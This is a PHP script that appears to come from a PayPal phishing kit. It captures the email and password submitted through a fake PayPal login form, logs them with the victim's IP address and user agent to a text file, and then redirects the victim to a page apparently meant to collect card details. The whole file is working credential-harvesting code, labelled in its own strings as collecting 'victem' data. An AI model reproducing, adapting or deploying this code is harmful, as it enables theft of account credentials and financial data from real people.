<?php

include '../Mckay‎‏/zero1.php';
include 'zero1.php';
/*
##############################################################
                           LOVE is fake
##############################################################
                           MR fake is me	
##############################################################
              https://web.facebook.com/yackson.garcia.161	
##############################################################			  
*/

$ip = getenv("REMOTE_ADDR");
$zeidan .="=========== <[ PayPal login ]> ===========\n";
$zeidan .="email		: ".$_POST['EML']."\n";
$zeidan .="password     : ".$_POST['PWD']."\n";
$zeidan .="=========== <[ victem IP info ]> =========\n";
$zeidan .="ip           : ".$ip."\n";
$zeidan .="USER AGENT  : {$_SERVER['HTTP_USER_AGENT']}\r\n";
$file = fopen("../../Attention.txt", 'a');
fwrite($file, $zeidan);
header ("Location:../../usa/carde.php");
?>